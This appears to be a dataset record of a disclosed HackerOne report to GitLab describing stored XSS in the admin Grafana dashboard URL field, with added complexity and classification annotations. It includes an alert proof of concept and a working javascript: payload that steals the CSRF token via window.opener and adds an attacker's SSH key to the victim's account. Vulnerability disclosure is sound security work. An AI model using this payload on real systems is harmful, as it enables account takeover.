{
  "reported_to": "GitLab",
  "reported_by": "xanbanx ",
  "title": "Stored XSS for Grafana dashboard URL",
  "content": "\nHi GitLab Security Team\nSummary\nI found a stored XSS vulnerability in the admins page. The administrator can set up a Grafana dashboard. Here, the administrator can either enter a relative URL or an absolute address. However, when adding an absolute URL, the protocol is not checked allowing to add a Javascript payload. However, when clicking on the URL, the corresponding <a> contains the target=\"_blank\" attribute, which means a new tab is opened. However, by exploiting the window.opener attribute, I still can access the original tab allowing me to steal for example the CSRF token.\nSteps to reproduce\nTested locally on GitLab Enterprise 12.3.0-pre 7e45734123b\nAs an administrator go to http://example.gitlab.com/admin/application_settings/metrics_and_profiling#js-grafana-settings\nEnter the following payload javascript:alert(window.opener.document.location)\nWithin the admin sidebar open Monitoring -> Metrics Dashboard\nSee the the Javascript being executed\nImpact\nStored Javascript code is being executed on behalf of another user's session. Although this is only visible within the admins page, it's severity is the same. A malicious administrator can attack other administrator users with that. For example, the CSRF token can be stolen allowing, i.e., to add the attacker's SSH key to the victims user account. This can be done for example using the following payload:\nCode 591 Bytes\n1javascript:var csrf = window.opener.$('meta[name=csrf-token]').attr('content'); window.opener.$.post('/profile/keys', { 'authenticity_token': csrf, 'key[key]': 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDUXhvMZ/BFqgVY4iWWv2lrs2alZHA6CoNcnZWH7gxObXGeFK89/itFbI8NrEDE291LRScBL1nuHs0xlf7uidf97uFGVMyIW8TKeaG/j5q6olr9ejiOZhiiGGkQZf1iSTV4VYN77EtG7iV62VB1ZbwnCau1xT5mlXbd8E4WzaHIxuOY8Ao8EozouaQzWt+I1xJx5rufVwItmTaX5QKV5Cuv8GhMRUb1UqujNKr22/rbWnut0pSzB1+uE4S4E1AaCNX9Byy0z65nzupk5kdj8y/qJ3pk8UBOgQtJCFEOwc42EHS3JwTeMRNRXs9bwqRJfXUomXL1LZ5Eua7UX7aQq7pf admin@foo.com', 'key[title]': 'admin@foo.com' });\nWhat is the current bug behavior?\nThe URL entered in the Grafana domain is not validated allowing arbitrary javascript being entered.\nWhat is the expected correct behavior?\nThe URL input field should only allow valid URLs for http(s).\nRelevant logs and/or screenshots\n(Paste any relevant logs - please use code blocks (```) to format console output,\nlogs, and code as it's very hard to read otherwise.)\nOutput of checks\nResults of GitLab environment info\nCode 969 Bytes\n1System information\n2System:         Ubuntu 18.04\n3Proxy:          no\n4Current User:   xanbanx\n5Using RVM:      no\n6Ruby Version:   2.6.3p62\n7Gem Version:    3.0.3\n8Bundler Version:1.17.2\n9Rake Version:   12.3.2\n10Redis Version:  4.0.9\n11Git Version:    2.23.0\n12Sidekiq Version:5.2.7\n13Go Version:     go1.12.6 linux/amd64\n14\n15GitLab information\n16Version:        12.3.0-pre\n17Revision:       7e45734123b\n18Directory:      /home/xanbanx/gdk/gdk-ee/gitlab\n19DB Adapter:     PostgreSQL\n20DB Version:     10.10\n21URL:            http://localhost:3001\n22HTTP Clone URL: http://localhost:3001/some-group/some-project.git\n23SSH Clone URL:  ssh://xanbanx@localhost:2222/some-group/some-project.git\n24Elasticsearch:  no\n25Geo:            no\n26Using LDAP:     no\n27Using Omniauth: yes\n28Omniauth Providers: \n29\n30GitLab Shell\n31Version:        9.4.1\n32Repository storage paths:\n33- default:      /home/xanbanx/gdk/gdk-ee/repositories\n34GitLab Shell path:              /home/xanbanx/gdk/gdk-ee/gitlab-shell\n35Git:            /usr/bin/git\n36\nBest,\nXanbanx\nImpact\nSee above\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {},
  "disclosed_date": 1657739520,
  "report_url": "https://hackerone.com/reports/684268",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "As an administrator, navigate to the Grafana settings page: http://example.gitlab.com/admin/application_settings/metrics_and_profiling#js-grafana-settings"
    ],
    [
      2,
      "Enter a malicious JavaScript payload in the URL field, e.g., javascript:alert(window.opener.document.location)"
    ],
    [
      3,
      "Navigate to Monitoring -> Metrics Dashboard to trigger the payload execution"
    ]
  ],
  "vuln_description": "A stored XSS vulnerability exists in the Grafana dashboard URL input field within the admin interface. The vulnerability allows an administrator to inject arbitrary JavaScript code, which is then executed when another administrator accesses the Metrics Dashboard. This can lead to session hijacking or CSRF token theft due to the window.opener property being accessible from the new tab.",
  "reason": "The vulnerability involves understanding the interaction between URL validation, the target=\"_blank\" attribute behavior, and the window.opener property. While the components are not overly complex, recognizing the potential for abuse through window.opener in this context requires some insight into browser security behaviors.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The vulnerability involves a stored XSS in the Grafana dashboard URL field where an administrator can inject JavaScript. The methodology described focuses on testing authentication and authorization boundaries by swapping user sessions and resource IDs, but does not specifically address input validation vulnerabilities like XSS. The XSS vulnerability here is not about crossing authorization boundaries but about improper input sanitization.",
    "is_detectable": false
  }
}